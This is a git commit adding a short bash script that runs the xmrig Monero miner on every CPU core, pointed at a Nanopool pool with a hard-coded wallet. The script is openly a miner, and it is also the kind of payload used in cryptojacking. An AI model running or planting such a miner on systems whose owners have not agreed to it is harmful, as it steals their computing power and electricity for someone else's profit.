f07e1a868c498f474d6d8e79cdf732cd4bd2ab97
Pavel Manakov <owfqw4a@gmail.com>
2022-06-29 04:51:55 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,9 @@
+#!/usr/bin/env bash
+
+set -x
+
+WALLET=8BPFG1TEFAbA9NMX2VWucYP8438Q2m3JGFBRZvYzp5m3bQsH2hfhiFtZnBpF1iP8KzG7xzYFbpiEtgMJuYyokLJWTXMWx15
+POOL=xmr-eu1.nanopool.org:14444
+THREADS=$(grep -c ^processor /proc/cpuinfo)
+
+./xmrig -o $POOL -u $WALLET -p x -t $THREADS
